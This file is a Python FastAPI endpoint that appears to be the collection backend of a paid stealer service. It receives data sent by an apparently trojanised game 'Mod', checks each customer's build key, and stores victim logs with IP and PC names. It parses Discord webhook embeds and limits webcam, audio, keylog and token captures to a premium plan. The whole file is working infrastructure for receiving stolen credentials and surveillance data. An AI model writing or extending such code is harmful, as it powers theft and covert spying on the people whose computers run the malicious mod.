from fastapi import APIRouter, Depends, HTTPException, Request
from sqlalchemy.orm import Session
from app.core.database import get_db
from app.models.user import User, Log, PlanType
from app.schemas.schemas import LogCreate
import json

router = APIRouter()

@router.post("/{build_key}")
async def receive_data(
    build_key: str,
    request: Request,
    db: Session = Depends(get_db)
):
    """
    Receive data from the Mod.
    """
    # 1. Validate Build Key
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")

    if not user.is_active:
        raise HTTPException(status_code=403, detail="User inactive")

    # 2. Parse Data
    try:
        data = await request.json()
    except:
        data = {}

    # Handle Discord Webhook Format (from Mod's sendWebhookEmbed)
    if 'embeds' in data:
        log_type = 'discord_embed'
        # Extract useful info from embed
        embed = data['embeds'][0]
        content = {
            'title': embed.get('title'),
            'description': embed.get('description'),
            'footer': embed.get('footer', {}).get('text')
        }
        # Try to parse PC Name/User from description if possible
        # Description format: "**Player:** ...\n**UUID:** ...\n**IP:** ...\n**PC:** Name/User"
        desc = embed.get('description', '')
        if '**PC:**' in desc:
            try:
                pc_part = desc.split('**PC:**')[1].strip()
                pc_name = pc_part
            except:
                pass
    else:
        # Standard Format
        log_type = data.get('type', 'unknown')
        content = data.get('data', '')
        pc_name = data.get('pc_name', 'Unknown')

    ip = request.client.host

    # 3. Plan-based Filtering
    if user.plan == PlanType.FREE:
        # Free users only get basic logs (e.g., chat, login)
        # Block premium features like webcam, audio, keylog, tokens
        if log_type in ['webcam', 'audio', 'keylog', 'tokens', 'discord']:
             return {"status": "ignored", "reason": "premium_only"}
    
    # 4. Store Data
    # For simplicity, we store everything as a Log entry for now.
    # In a real app, we might have separate tables for Tokens, etc.
    
    new_log = Log(
        user_id=user.id,
        log_type=log_type,
        content=json.dumps(content) if isinstance(content, (dict, list)) else str(content),
        ip_address=ip,
        pc_name=pc_name
    )
    db.add(new_log)
    db.commit()

    return {"status": "success"}
